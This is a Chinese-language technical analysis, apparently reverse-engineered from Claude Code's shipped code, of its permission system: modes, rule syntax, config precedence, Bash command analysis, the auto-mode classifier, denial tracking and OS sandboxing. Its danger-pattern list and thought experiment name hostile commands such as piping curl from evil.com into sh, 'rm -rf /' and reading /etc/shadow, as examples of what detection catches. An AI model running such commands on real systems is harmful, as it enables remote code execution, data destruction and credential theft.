<p align="right"><a href="../en/05_module_permission.md">English</a></p>

# 阶段 5：权限系统深度解剖

> 权限系统是 Claude Code 的安全核心。本章从接口契约到实现细节、从 Bash 命令安全分析到 OS 级沙箱隔离，完整剖析横跨 **111 个源文件**的多层权限体系。所有分析均经由 Source Map 反向推导、`cli.js` 运行时代码交叉验证。


## 目录

1. [接口契约](#1-接口契约)
   - 1.1 [PermissionMode — 权限模式枚举](#11-permissionmode--权限模式枚举)
   - 1.2 [PermissionRule — 权限规则定义](#12-permissionrule--权限规则定义)
   - 1.3 [PermissionResult — 权限决策结果](#13-permissionresult--权限决策结果)
   - 1.4 [PermissionContext — 权限上下文](#14-permissioncontext--权限上下文)
   - 1.5 [ToolPermissionContext — 工具权限上下文](#15-toolpermissioncontext--工具权限上下文)
   - 1.6 [权限检查入口函数](#16-权限检查入口函数)
2. [实现机制](#2-实现机制)
   - 2.1 [三层权限架构](#21-三层权限架构)
   - 2.2 [六层配置优先级体系](#22-六层配置优先级体系)
   - 2.3 [权限决策流程](#23-权限决策流程)
   - 2.4 [Bash 命令安全分析](#24-bash-命令安全分析)
   - 2.5 [自动模式分类器（Auto Mode Classifier）](#25-自动模式分类器auto-mode-classifier)
   - 2.6 [拒绝追踪（Denial Tracking）](#26-拒绝追踪denial-tracking)
   - 2.7 [权限 UI 组件体系](#27-权限-ui-组件体系)
   - 2.8 [沙箱集成](#28-沙箱集成)
   - 2.9 [Swarm 权限同步](#29-swarm-权限同步)
3. [演进思维实验](#3-演进思维实验)
4. [验证](#4-验证)


## 1. 接口契约

权限系统的接口契约分布在 6 个核心类型定义和 3 个处理器入口之中。以下逐一解析。

### 1.1 PermissionMode — 权限模式枚举

**源文件**：`src/utils/permissions/PermissionMode.ts`

权限模式决定了工具调用时的全局安全策略。从 `cli.js` 中提取到的枚举定义：

```typescript
// 基础模式（5 种）
const basePermissionModes = [
  "acceptEdits",
  "bypassPermissions",
  "default",
  "dontAsk",
  "plan"
];

// 完整模式（6 种，含 auto）
const permissionModes = [...basePermissionModes, "auto"];
```

| 模式 | 行为 | 适用场景 |
|------|------|----------|
| `default` | 对所有非只读操作弹出权限确认 | 首次使用、高安全要求场景 |
| `acceptEdits` | 自动允许文件编辑类操作，其他仍需确认 | 日常开发，信任文件编辑 |
| `plan` | 分析模式——只生成计划，不直接执行 | 审查复杂任务、团队评审 |
| `bypassPermissions` | 跳过所有权限提示（需 `allowDangerouslySkipPermissions: true`） | CI/CD、自动化脚本 |
| `dontAsk` | 不弹出提示——未预授权的操作静默拒绝 | Headless Agent、后台任务 |
| `auto` | 由 AI 分类器自动判断是否安全执行 | 高效开发，平衡安全与流畅 |

**关键设计决策**：`dontAsk` 不是"全部允许"，而是"全部拒绝（除非已通过规则预授权）"。这是一个常见的误解点——它是最保守的模式之一。

### 1.2 PermissionRule — 权限规则定义

**源文件**：`src/utils/permissions/PermissionRule.ts`、`src/utils/permissions/permissionRuleParser.ts`

权限规则使用声明式语法，支持三种粒度：

```json
{
  "permissions": {
    "allow": ["Bash(npm:*)", "Edit(.claude)", "Read"],
    "deny": ["Bash(rm -rf:*)"],
    "ask": ["Write(/etc/*)"],
    "defaultMode": "default",
    "additionalDirectories": ["/extra/dir"]
  }
}
```

**规则匹配语法**：

| 模式 | 示例 | 含义 |
|------|------|------|
| 精确匹配 | `"Bash(npm run test)"` | 仅匹配 `npm run test` |
| 前缀通配 | `"Bash(git:*)"` | 匹配 `git status`、`git commit` 等 |
| 工具级 | `"Read"` | 允许所有 Read 操作 |
| 域名匹配 | `"WebFetch(domain:example.com)"` | 限定 WebFetch 到指定域 |

**规则来源字段**：

每条规则携带来源标记（`source`），标识其生效优先级：

```
"policySettings"  → 企业 MDM 策略（最高优先级，不可覆盖）
"flagSettings"    → Feature Flag 远程下发
"userSettings"    → 用户个人配置 (~/.claude/settings.json)
"projectSettings" → 项目级配置 (.claude/settings.json)
"localSettings"   → 本地配置 (.claude/settings.local.json)
"command"         → CLI 命令行参数
```

### 1.3 PermissionResult — 权限决策结果

**源文件**：`src/utils/permissions/PermissionResult.ts`

权限决策返回结构化结果，携带行为指令和追溯信息：

```typescript
interface PermissionResult {
  behavior: "allow" | "deny" | "ask" | "passthrough";
  message?: string;
  updatedInput?: unknown;
  suggestions?: PermissionSuggestion[];
  decisionReason?: PermissionDecisionReason;
}
```

**决策理由类型**（`PermissionDecisionReason`）：

| 类型 | 说明 |
|------|------|
| `type: "rule"` | 匹配到预定义的 allow/deny/ask 规则 |
| `type: "mode"` | 由权限模式决定（如 `bypassPermissions` 全部允许） |
| `type: "classifier"` | 自动模式分类器判定 |
| `type: "hook"` | PermissionRequest Hook 决策 |
| `type: "asyncAgent"` | Headless 异步代理模式 |
| `type: "safetyCheck"` | 安全检查（危险模式检测等） |
| `type: "other"` | 其他原因（如分类器上下文窗口溢出） |

### 1.4 PermissionContext — 权限上下文

**源文件**：`src/hooks/toolPermission/PermissionContext.ts`

React Context，负责跨组件传递权限状态。这是权限系统与 Ink UI 框架的桥接点：

```
PermissionContext
├── 当前权限模式
├── 已授权规则列表
├── 已拒绝规则列表
├── 权限回调函数集
└── UI 组件渲染状态
```

**生命周期**：随应用启动创建，响应用户交互和配置变更动态更新。

### 1.5 ToolPermissionContext — 工具权限上下文

**源文件**：从 `cli.js` 中提取的运行时数据结构

```typescript
interface ToolPermissionContext {
  mode: PermissionMode;
  additionalWorkingDirectories: Map<string, unknown>;
  alwaysAllowRules: Record<string, unknown>;
  alwaysDenyRules: Record<string, unknown>;
  alwaysAskRules: Record<string, unknown>;
  isBypassPermissionsModeAvailable: boolean;
  shouldAvoidPermissionPrompts?: boolean;
}
```

这是权限检查的核心数据载体。每次工具调用前，系统从 `AppState.toolPermissionContext` 获取这一结构，驱动整个决策流程。

### 1.6 权限检查入口函数

**三个处理器**（按调用场景分发）：

| 处理器 | 源文件 | 职责 |
|--------|--------|------|
| `interactiveHandler.ts` | `src/hooks/toolPermission/handlers/` | 交互式 CLI 会话的权限处理 |
| `coordinatorHandler.ts` | 同上 | 多 Agent 协作（Coordinator）场景 |
| `swarmWorkerHandler.ts` | 同上 | Swarm Worker 进程的权限代理 |

**核心函数调用链**：

```
initializeToolPermissionContext()   // 初始化权限上下文（CLI 启动时）
        ↓
getToolPermissionContext()          // 获取当前权限上下文
        ↓
aPK(tool, input, context)           // 主权限检查入口
  ├── dm8() → 检查 deny 规则
  ├── EZK() → 检查 allow 规则
  ├── tool.checkPermissions()       // 工具自身的权限逻辑
  └── 模式分发 → 分类器/UI/静默处理
```


## 2. 实现机制

### 2.1 三层权限架构

Claude Code 的权限系统采用三层纵深防御架构：

```
┌─────────────────────────────────────────────────────────────────────┐
│  第一层：全局配置层                                                    │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │
│  │ toolPermission   │  │ managed-settings │  │ 6 层配置优先级    │  │
│  │ Mode (6 种模式)   │  │ .json (MDM策略)  │  │ 覆盖机制         │  │
│  └──────────────────┘  └──────────────────┘  └──────────────────┘  │
├─────────────────────────────────────────────────────────────────────┤
│  第二层：工具层                                                       │
│  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌──────────────────┐   │
│  │ Bash      │ │ FileEdit  │ │ FileWrite │ │ WebFetch         │   │
│  │ 命令分类   │ │ 路径验证   │ │ 路径验证   │ │ 域名验证         │   │
│  │ 危险检测   │ │ 差异展示   │ │ 内容审查   │ │ 网络隔离         │   │
│  └───────────┘ └───────────┘ └───────────┘ └──────────────────┘   │
├─────────────────────────────────────────────────────────────────────┤
│  第三层：命令层（仅 Bash/PowerShell）                                 │
│  ┌───────────┐ ┌───────────────┐ ┌──────────────┐ ┌────────────┐  │
│  │ bashClass │ │ dangerous     │ │ yoloClass    │ │ shellRule  │  │
│  │ ifier.ts  │ │ Patterns.ts   │ │ ifier.ts     │ │ Matching   │  │
│  └───────────┘ └───────────────┘ └──────────────┘ └────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

**第一层——全局配置层**决定总体行为策略。企业管理员通过 `managed-settings.json` 可以强制限定权限模式、禁用危险选项、要求沙箱等。个人用户通过 `settings.json` 或 CLI 参数进行定制。

**第二层——工具层**中，每种工具实现自己的 `checkPermissions()` 方法。例如：
- **Bash**：调用 Bash 分类器，进行命令安全分析
- **FileEdit/FileWrite**：验证目标路径是否在允许的工作目录内，生成差异预览
- **WebFetch**：验证目标域名是否在允许列表中
- **MCP 工具**：返回 `passthrough`，由外部权限系统决策

**第三层——命令层**仅对 Bash 和 PowerShell 工具生效，提供深度的命令语义分析。

### 2.2 六层配置优先级体系

权限规则来自 6 个配置源，按严格的优先级层叠覆盖：

```
优先级（高 → 低）:
┌──────────────────────────────────────────────────────────────┐
│ 1. policySettings (企业 MDM 策略)                             │
│    路径: /Library/Application Support/ClaudeCode/             │
│         managed-settings.json + managed-settings.d/*.json    │
│    特性: 不可被用户覆盖, 支持 drop-in 目录扩展                 │
├──────────────────────────────────────────────────────────────┤
│ 2. flagSettings (Feature Flags)                              │
│    来源: 服务端远程下发                                        │
│    特性: A/B 测试、渐进式功能发布                               │
├──────────────────────────────────────────────────────────────┤
│ 3. userSettings (用户个人配置)                                │
│    路径: ~/.claude/settings.json                              │
│    特性: 跨项目通用，随用户账户迁移                              │
├──────────────────────────────────────────────────────────────┤
│ 4. projectSettings (项目级配置)                               │
│    路径: .claude/settings.json (可提交到版本控制)               │
│    特性: 团队共享，项目级别的权限策略                            │
├──────────────────────────────────────────────────────────────┤
│ 5. localSettings (本地配置)                                   │
│    路径: .claude/settings.local.json (不应提交到版本控制)       │
│    特性: 个人本地覆盖，gitignore 友好                          │
├──────────────────────────────────────────────────────────────┤
│ 6. command (CLI 命令行参数)                                   │
│    来源: --permission-mode, --allowedTools 等参数              │
│    特性: 一次性覆盖，不持久化                                   │
└──────────────────────────────────────────────────────────────┘
```

**企业管控机制**：

`policySettings` 支持多个强力控制开关：

| 配置键 | 效果 |
|--------|------|
| `allowManagedPermissionRulesOnly` | 仅使用企业规则，忽略用户/项目/本地规则 |
| `allowManagedHooksOnly` | 仅执行企业配置的 Hooks |
| `allowManagedDomainsOnly` | 仅允许企业批准的网络域名 |
| `allowManagedMcpServersOnly` | MCP 服务器允许列表仅来自企业配置 |
| `allowManagedReadPathsOnly` | 沙箱读路径仅来自企业配置 |
| `disableBypassPermissionsMode` | 禁止使用 `bypassPermissions` 模式 |
| `disableAutoMode` | 禁止使用 `auto` 模式 |

**MDM 路径规范**（按平台）：

| 平台 | 基础配置路径 | Drop-in 目录 |
|------|-------------|-------------|
| macOS | `/Library/Application Support/ClaudeCode/managed-settings.json` | `managed-settings.d/*.json` |
| macOS (MDM) | `/Library/Managed Preferences/com.anthropic.claudecode.plist` | — |
| Linux | `/etc/claude-code/managed-settings.json` | `managed-settings.d/*.json` |
| Windows | `HKLM\SOFTWARE\Policies\ClaudeCode` 注册表 | — |

### 2.3 权限决策流程

每次工具调用触发以下决策流程（从 `cli.js` 运行时代码 `aPK()` 函数反向推导）：

```
工具调用请求
    │
    ▼
[1] 查询 deny 规则 (dm8)
    │── 匹配 → 直接拒绝 ─────────────────────────→ { behavior: "deny" }
    │
    ▼
[2] 查询 allow 规则 (EZK)
    │── 匹配 → 跳过权限检查 ──────────────────────→ { behavior: "allow" }
    │
    ▼
[3] 工具自身 checkPermissions()
    │── 返回安全检查结果（behavior, suggestions）
    │
    ▼
[4] 权限模式分发
    ├── bypassPermissions ──→ 全部允许
    │
    ├── plan (isBypassPermissionsModeAvailable)
    │   └──→ 全部允许（计划模式的绕过路径）
    │
    ├── dontAsk ───────────→ 静默拒绝 ────────────→ { behavior: "deny" }
    │
    ├── auto / plan(auto) ─→ [5] 自动模式分类器
    │   ├── 分类器通过 ────→ { behavior: "allow" }
    │   ├── 分类器拒绝 ────→ 检查拒绝限制
    │   │   ├── headless ──→ 抛出 AbortError
    │   │   └── CLI ───────→ 回退到交互式提示
    │   └── 分类器不可用 ──→ 根据 fail-open/fail-closed 策略处理
    │
    ├── acceptEdits ───────→ 对编辑类工具自动允许
    │   └── 其他工具 ──────→ [6] 交互式提示
    │
    └── default ───────────→ [6] 交互式提示
                               │
                               ▼
                    用户选择: 允许 / 拒绝 / 记住决策
                               │
                               ├── 允许（记住）──→ 添加 allow 规则
                               ├── 拒绝（记住）──→ 添加 deny 规则
                               └── 一次性决策 ──→ 仅本次生效
                               │
                               ▼
                    记录决策 → 更新 denialTracking → 返回结果
```

**PermissionRequest Hook 拦截**：

在 Headless Agent 场景中，步骤 [6] 之前会先检查 `PermissionRequest` Hook：

```typescript
// Hooks 配置中的 PermissionRequest 事件
{
  "hooks": {
    "PermissionRequest": [{
      "matcher": "Bash|Edit",
      "hooks": [{
        "type": "command",
        "command": "/path/to/permission-checker.sh"
      }]
    }]
  }
}
```

Hook 可以返回 `{ "decision": "allow" }` 或 `{ "decision": "deny", "message": "..." }` 来代替交互式提示。

### 2.4 Bash 命令安全分析

Bash 工具拥有权限系统中最复杂的安全分析管线。涉及 4 个专用源文件协同工作：

**源文件清单**：

| 文件 | 职责 |
|------|------|
| `src/utils/permissions/bashClassifier.ts` | Bash 命令分类器主逻辑 |
| `src/utils/permissions/dangerousPatterns.ts` | 危险模式匹配规则库 |
| `src/utils/permissions/yoloClassifier.ts` | 自动接受模式的命令分类 |
| `src/utils/permissions/shellRuleMatching.ts` | Shell 规则匹配引擎 |

**五步安全分析流程**：

```
Bash 命令字符串
    │
    ▼
[步骤 1] 命令解析
    │ 解析管道 (|)、重定向 (>, >>)、变量替换 ($...)
    │ 识别子命令、命令链 (&&, ||, ;)
    │ 提取命令名称和参数
    │
    ▼
[步骤 2] 危险模式匹配 (dangerousPatterns.ts)
    │ Level 1 - 远程代码执行:
    │   curl | sh, wget | bash, eval "$(curl ...)"
    │
    │ Level 2 - 数据销毁:
    │   rm -rf /, drop database, format disk
    │
    │ Level 3 - 系统级操作:
    │   sudo, chmod 777, chown, systemctl
    │
    │ Level 4 - 信息泄露:
    │   cat /etc/shadow, curl external-server
    │── 匹配任一级别 → 标记为 "safetyCheck" ────→ 需要人工确认
    │
    ▼
[步骤 3] 只读验证 (isReadOnly)
    │ 判断命令是否为只读操作
    │ 内置只读命令白名单:
    │   ls, cat, head, tail, wc, grep, find, git log,
    │   git status, git diff, git branch, echo, pwd,
    │   which, type, file, stat, du, df, env, printenv
    │── 纯只读命令 → 直接允许（不需要权限检查）
    │
    ▼
[步骤 4] Sed 编辑验证 (特殊路径)
    │ 检测 sed -i / sed --in-place 编辑命令
    │ 提取目标文件路径
    │ 验证路径是否在允许范围内
    │ 生成差异预览供用户确认
    │
    ▼
[步骤 5] 路径验证 (pathValidation.ts)
    │ 确保命令操作在允许的工作目录范围内
    │ 检查 additionalDirectories 配置
    │ 阻止路径遍历攻击 (../../etc/passwd)
    │
    ▼
返回 PermissionResult
```

**yoloClassifier 的角色**：

当权限模式为 `auto` 或用户使用了 `bypassPermissions` 时，`yoloClassifier.ts` 负责对命令进行快速分类，决定哪些命令可以安全地自动执行。它维护一个更宽松的白名单，但仍然拒绝 Level 1-2 的危险模式。

**Shell 规则匹配引擎**（`shellRuleMatching.ts`）：

支持用户通过规则精细控制 Bash 命令权限：

```json
{
  "permissions": {
    "allow": [
      "Bash(npm:*)",       // 允许所有 npm 命令
      "Bash(git:*)",       // 允许所有 git 命令
      "Bash(make build)"   // 允许精确的 make build
    ],
    "deny": [
      "Bash(rm -rf:*)"     // 禁止所有 rm -rf 变体
    ]
  }
}
```

匹配引擎提取命令前缀，与规则进行通配符匹配。`Bash(npm:*)` 会匹配 `npm install`、`npm run test`、`npm publish` 等所有以 `npm` 开头的命令。

### 2.5 自动模式分类器（Auto Mode Classifier）

`auto` 模式是权限系统中最精巧的部分。它使用 AI 分类器替代用户进行权限判定，在安全性和工作流效率之间取得平衡。

**源文件**：

| 文件 | 职责 |
|------|------|
| `src/utils/permissions/classifierDecision.ts` | 分类器决策逻辑 |
| `src/utils/permissions/classifierShared.ts` | 分类器共享工具函数 |
| `src/utils/permissions/autoModeState.ts` | 自动模式状态管理 |
| `src/utils/classifierApprovals.ts` | 分类器审批记录 |
| `src/utils/classifierApprovalsHook.ts` | 分类器审批的 Hook 集成 |

**分类器工作流**：

```
工具调用 (behavior == "ask")
        │
        ▼
[Gate 检查] isAutoModeGateEnabled()
        │── Gate 关闭 → 回退到交互式
        │
        ▼
[可用性检查] getAutoModeUnavailableReason()
        │── 不可用 → 根据 fail-open/fail-closed 策略处理
        │
        ▼
[两阶段分类] kL8()
        │
        ├── Stage 1: 快速预筛选
        │   ├── 检查工具是否需要显式用户许可
        │   ├── 检查安全检查标记 (classifierApprovable)
        │   └── 在 acceptEdits 模式下预检
        │
        └── Stage 2: AI 模型决策
            ├── 构造分类 Prompt（包含对话上下文、工具调用详情）
            ├── 调用 AI 模型（使用 Haiku 级别模型以降低延迟）
            └── 解析决策结果 (shouldBlock, reason)
        │
        ▼
[遥测记录] tengu_auto_mode_decision
        │ 记录: decision, toolName, classifierModel,
        │       durationMs, inputTokens, outputTokens,
        │       stage, costUSD
        │
        ▼
[结果处理]
        ├── allowed → { behavior: "allow", decisionReason: { type: "classifier" } }
        ├── blocked → 更新 denialTracking → 检查拒绝限制
        └── unavailable → fail-open 或 fail-closed
```

**自动模式的用户可配置性**：

```json
{
  "autoMode": {
    "allow": ["npm run test", "git status"],
    "soft_deny": ["rm -rf", "sudo"],
    "environment": ["CI=true"]
  }
}
```

- `allow`：告知分类器这些命令在当前项目中是安全的
- `soft_deny`：提示分类器这些命令通常不应自动批准
- `environment`：为分类器提供环境上下文信息

**危险权限检测**：

在进入自动模式前，系统会扫描并移除"过于宽泛"的权限规则：

```typescript
// 导出函数清单（从 cli.js 提取）
isOverlyBroadBashAllowRule()       // 检测宽泛的 Bash 允许规则
isOverlyBroadPowerShellAllowRule() // 检测宽泛的 PowerShell 允许规则
isDangerousBashPermission()        // 检测危险的 Bash 权限
isDangerousPowerShellPermission()  // 检测危险的 PowerShell 权限
isDangerousTaskPermission()        // 检测危险的 Task 权限
findDangerousClassifierPermissions() // 查找所有危险的分类器权限
stripDangerousPermissionsForAutoMode() // 进入 auto 模式时剥离危险权限
restoreDangerousPermissions()      // 退出 auto 模式时恢复
```

这确保了即使用户配置了宽泛的 `allow` 规则，自动模式分类器仍然会对这些操作进行审查。

### 2.6 拒绝追踪（Denial Tracking）

**源文件**：`src/utils/permissions/denialTracking.ts`、`src/utils/autoModeDenials.ts`

拒绝追踪系统监控权限拒绝的频率，在达到阈值时采取保护性措施。

**数据结构**：

```typescript
// 拒绝追踪状态
interface DenialTracking {
  consecutiveDenials: number;  // 连续拒绝计数
  totalDenials: number;        // 会话总拒绝计数
}

// 初始值
function yp8(): DenialTracking {
  return { consecutiveDenials: 0, totalDenials: 0 };
}

// 阈值常量
const DENIAL_LIMITS = {
  maxConsecutive: 3,   // 连续拒绝上限
  maxTotal: 20         // 会话总拒绝上限
};
```

**触发机制**：

```
拒绝事件 → UWK() 递增计数器
      ↓
QWK() 检查是否超限
      ├── 连续拒绝 >= 3 次
      │   ├── Headless 模式 → 抛出 AbortError（终止 Agent）
      │   └── CLI 模式 → 回退到交互式提示，显示警告
      │
      └── 总拒绝 >= 20 次
          ├── Headless 模式 → 抛出 AbortError
          └── CLI 模式 → 重置计数器，显示总结提示
```

**设计意图**：

防止 AI 模型在权限受限时陷入无限重试循环。当分类器反复拒绝某类操作时，系统强制暂停，要求用户介入审查。对于 Headless Agent，这是一个安全熔断器——防止失控的自动化任务。

**遥测事件**：`tengu_auto_mode_denial_limit_exceeded`，记录触发限制时的上下文：

```typescript
{
  limit: "total" | "consecutive",
  mode: "headless" | "cli",
  messageID: string,
  consecutiveDenials: number,
  totalDenials: number,
  toolName: string
}
```

### 2.7 权限 UI 组件体系

权限系统拥有 **59 个 UI 组件文件**，构成了面向用户的权限交互界面。

**组件层次结构**：

```
src/components/permissions/
├── PermissionPrompt.tsx              # 权限提示主容器
├── PermissionRequest.tsx             # 权限请求基础组件
├── PermissionDialog.tsx              # 通用权限对话框
├── PermissionRequestTitle.tsx        # 权限请求标题
├── PermissionExplanation.tsx         # 权限说明文本
├── PermissionRuleExplanation.tsx     # 规则匹配说明
├── PermissionDecisionDebugInfo.tsx   # 决策调试信息
│
├── BashPermissionRequest/            # Bash 专用权限 UI
│   ├── BashPermissionRequest.tsx     #   命令预览 + 操作选项
│   └── bashToolUseOptions.tsx        #   Bash 工具选项定义
│
├── FileEditPermissionRequest/        # 文件编辑权限 UI
│   └── FileEditPermissionRequest.tsx #   差异预览 + 编辑确认
│
├── FileWritePermissionRequest/       # 文件写入权限 UI
│   ├── FileWritePermissionRequest.tsx#   新建文件确认
│   └── FileWriteToolDiff.tsx         #   文件内容差异展示
│
├── FilePermissionDialog/             # 文件权限对话框（共享）
│   ├── FilePermissionDialog.tsx      #   通用文件权限 UI 框架
│   ├── permissionOptions.tsx         #   权限选项（允许/拒绝/记住）
│   ├── useFilePermissionDialog.ts    #   对话框状态 Hook
│   ├── usePermissionHandler.ts       #   权限处理 Hook
│   └── ideDiffConfig.ts             #   IDE 差异配置
│
├── NotebookEditPermissionRequest/    # Notebook 编辑权限 UI
│   ├── NotebookEditPermissionRequest.tsx
│   └── NotebookEditToolDiff.tsx
│
├── SedEditPermissionRequest/         # sed 编辑权限 UI
│   └── SedEditPermissionRequest.tsx
│
├── PowerShellPermissionRequest/      # PowerShell 权限 UI
│   ├── PowerShellPermissionRequest.tsx
│   └── powershellToolUseOptions.tsx
│
├── WebFetchPermissionRequest/        # 网络请求权限 UI
│   └── WebFetchPermissionRequest.tsx
│
├── ComputerUseApproval/              # Computer Use 权限 UI
│   └── ComputerUseApproval.tsx
│
├── AskUserQuestionPermissionRequest/ # 提问权限 UI（7 个文件）
│   ├── AskUserQuestionPermissionRequest.tsx
│   ├── PreviewBox.tsx
│   ├── PreviewQuestionView.tsx
│   ├── QuestionNavigationBar.tsx
│   ├── QuestionView.tsx
│   ├── SubmitQuestionsView.tsx
│   └── use-multiple-choice-state.ts
│
├── SkillPermissionRequest/           # Skill 权限 UI
│   └── SkillPermissionRequest.tsx
│
├── SandboxPermissionRequest.tsx      # 沙箱权限 UI
├── FilesystemPermissionRequest.tsx   # 文件系统权限 UI
├── FallbackPermissionRequest.tsx     # 兜底权限 UI
├── WorkerBadge.tsx                   # Worker 标识
├── WorkerPendingPermission.tsx       # Worker 等待权限
│
├── hooks.ts                          # 权限相关 Hooks
├── shellPermissionHelpers.tsx        # Shell 权限辅助函数
├── useShellPermissionFeedback.ts     # Shell 权限反馈 Hook
├── utils.ts                          # 权限工具函数
│
└── rules/                            # 规则管理 UI
    ├── AddPermissionRules.tsx         #   添加权限规则
    ├── AddWorkspaceDirectory.tsx      #   添加工作目录
    ├── RemoveWorkspaceDirectory.tsx   #   移除工作目录
    ├── PermissionRuleDescription.tsx  #   规则描述
    ├── PermissionRuleInput.tsx        #   规则输入
    ├── PermissionRuleList.tsx         #   规则列表
    ├── RecentDenialsTab.tsx           #   最近拒绝记录
    └── WorkspaceTab.tsx              #   工作区选项卡
```

**顶层组件**：

| 组件 | 源文件 | 用途 |
|------|--------|------|
| `BypassPermissionsModeDialog` | `src/components/BypassPermissionsModeDialog.tsx` | 进入 bypass 模式的确认对话框 |
| `SandboxViolationExpandedView` | `src/components/SandboxViolationExpandedView.tsx` | 沙箱违规详情展开视图 |

### 2.8 沙箱集成

沙箱是权限系统的最后一道防线——即使权限检查通过，OS 级别的沙箱仍然限制进程的实际能力。

**源文件清单**：

| 文件 | 职责 |
|------|------|
| `src/tools/BashTool/shouldUseSandbox.ts` | 沙箱启用决策逻辑 |
| `src/utils/sandbox/sandbox-adapter.ts` | 沙箱适配器（跨平台） |
| `src/utils/sandbox/sandbox-ui-utils.ts` | 沙箱 UI 辅助 |
| `@anthropic-ai/sandbox-runtime` (依赖包) | 沙箱运行时实现 |

**沙箱运行时子模块**（`@anthropic-ai/sandbox-runtime`）：

```
sandbox-runtime/
├── sandbox-manager.js     # 沙箱生命周期管理
├── sandbox-config.js      # 配置模式定义
├── sandbox-utils.js       # 通用工具函数
├── sandbox-violation-store.js # 违规记录存储
├── macos-sandbox-utils.js # macOS sandbox-exec 适配
├── linux-sandbox-utils.js # Linux Bubblewrap 适配
├── generate-seccomp-filter.js # Linux seccomp 过滤器生成
├── http-proxy.js          # HTTP 代理（网络隔离）
├── socks-proxy.js         # SOCKS 代理
└── utils/
    ├── platform.js        # 平台检测
    ├── ripgrep.js         # ripgrep 沙箱内路径
    └── which.js           # 命令查找
```

**平台实现差异**：

| 特性 | macOS | Linux |
|------|-------|-------|
| 沙箱技术 | `sandbox-exec` (Seatbelt) | Bubblewrap (`bwrap`) + seccomp |
| 配置格式 | `.sb` Profile (Scheme 风格) | 命令行参数 |
| 网络隔离 | Profile 规则 | seccomp + 代理 |
| 文件系统限制 | Profile 规则 (allow/deny) | 绑定挂载 |
| Unix Socket | Profile 规则控制 | seccomp 无法按路径过滤 |

**macOS sandbox-exec 集成**（从 `cli.js` 提取）：

```javascript
// 构造沙箱命令
let command = shellQuote(["env", ...envVars,
  "sandbox-exec", "-p", profileString,
  shellPath, "-c", userCommand
]);
```

日志监控违规事件：

```javascript
// 监控沙箱违规
const logStream = spawn("log", [
  "stream",
  "--predicate", `(eventMessage ENDSWITH "${sentinel}")`,
  "--style", "compact"
]);
```

**沙箱配置结构**（Zod Schema 定义）：

```typescript
SandboxConfig = {
  enabled: boolean,
  failIfUnavailable?: boolean,
  autoAllowBashIfSandboxed?: boolean,
  allowUnsandboxedCommands?: boolean,
  network?: {
    allowedDomains: string[],
    deniedDomains: string[],
    allowUnixSockets: string[],
    allowAllUnixSockets: boolean,
    allowLocalBinding: boolean,
    httpProxyPort: number,
    socksProxyPort: number
  },
  filesystem?: {
    allowWrite: string[],
    denyWrite: string[],
    denyRead: string[],
    allowRead: string[]
  },
  ignoreViolations?: Record<string, string[]>,
  enableWeakerNestedSandbox?: boolean,
  enableWeakerNetworkIsolation?: boolean,
  excludedCommands?: string[],
  ripgrep?: { command: string, args?: string[] }
}
```

**`autoAllowBashIfSandboxed` 的协同效应**：

当沙箱启用时（默认为 `true`），Bash 命令在沙箱保护下自动跳过权限提示。这实现了安全性与效率的平衡——沙箱限制了进程的系统级能力，因此不需要逐条命令确认。

**`allowUnsandboxedCommands` 控制**：

控制 `dangerouslyDisableSandbox` 参数是否生效。设为 `false` 时，所有命令必须在沙箱内运行，彻底消除沙箱逃逸路径。

### 2.9 Swarm 权限同步

在 Swarm（多 Agent 协作）场景中，权限需要在 Leader 和 Worker 之间同步。

**源文件**：

| 文件 | 职责 |
|------|------|
| `src/utils/swarm/leaderPermissionBridge.ts` | Leader 端权限桥接 |
| `src/utils/swarm/permissionSync.ts` | Worker → Leader 权限同步 |
| `src/hooks/toolPermission/handlers/swarmWorkerHandler.ts` | Worker 权限处理器 |
| `src/bridge/bridgePermissionCallbacks.ts` | Bridge 权限回调 |

**同步模型**：

```
Worker 1  ──┐
Worker 2  ──┤──→ Leader (权限决策中心) ──→ 用户
Worker 3  ──┘
```

Worker 进程没有独立的权限决策能力。当需要权限确认时，请求通过 `leaderPermissionBridge` 转发到 Leader 进程，由 Leader 的权限系统（或用户交互）做出决策，然后结果同步回 Worker。


## 3. 演进思维实验

### Level 1（朴素方案）：全局开关

```
if (globalPermission === "allow") {
  executeAll();
} else {
  denyAll();
}
```

**问题**：
- 无法区分 `ls`（安全）和 `rm -rf /`（灾难性）
- 用户被迫在"完全信任"和"完全不可用"之间选择
- 不适合任何生产环境

### Level 2（瓶颈方案）：简单白/黑名单

```
whitelist = ["ls", "cat", "git"]
blacklist = ["rm", "sudo"]

if (command in blacklist) deny();
else if (command in whitelist) allow();
else askUser();
```

**问题**：
- 无法处理 `curl http://evil.com | sh`（命令本身是合法的 `curl`）
- 路径遍历攻击：`cat ../../etc/shadow`
- 每个未知命令都要询问用户，体验极差
- 无法处理复合命令（管道、重定向、子 Shell）
- 规则膨胀——团队中每个人都需要维护自己的列表

### Level 3（当前方案）：多层权限 + 智能分类

Claude Code 的实际实现解决了上述所有问题：

| 维度 | Level 1/2 的问题 | Level 3 的解决方案 |
|------|-----------------|-------------------|
| 命令注入 | `curl \| sh` 无法检测 | 管道分析 + 危险模式检测引擎 |
| 路径遍历 | `../../etc/shadow` 通过 | 路径验证 + 工作目录限制 + 沙箱 |
| 用户体验 | 频繁打断 | 6 种模式适应不同场景 + AI 分类器 |
| 团队协作 | 规则不可共享 | 6 层配置优先级 + 项目/企业级策略 |
| 自动化 | 无法无人值守 | `dontAsk` + `auto` + PermissionRequest Hook |
| 进程隔离 | 应用层唯一防线 | OS 级沙箱（sandbox-exec / bwrap） |
| 失控保护 | 无限重试 | 拒绝追踪 + 熔断机制 |
| 企业管控 | 无法强制策略 | MDM + policySettings 不可覆盖 |
| 审计追踪 | 无记录 | 遥测事件 + 决策理由链 + 违规存储 |

**从 Level 2 到 Level 3 的关键跃迁**：

1. **从"命令名匹配"到"命令语义分析"**：bashClassifier 不只看命令名，而是分析完整的命令链、参数、管道和重定向
2. **从"二分决策"到"上下文感知决策"**：AI 分类器考虑对话上下文、项目特征、历史操作模式
3. **从"应用层防护"到"OS 级隔离"**：即使权限系统被绕过，沙箱仍然是最后屏障
4. **从"每次询问"到"学习+记忆"**：用户的"记住"选择会持久化为规则，逐步减少打断


## 4. 验证

### 4.1 源文件覆盖统计

| 分类 | 文件数 | 关键文件 |
|------|--------|----------|
| UI 组件 | 59 | `PermissionPrompt.tsx`, `BashPermissionRequest.tsx` 等 |
| 工具函数 | 32 | `permissions.ts`, `bashClassifier.ts`, `denialTracking.ts` 等 |
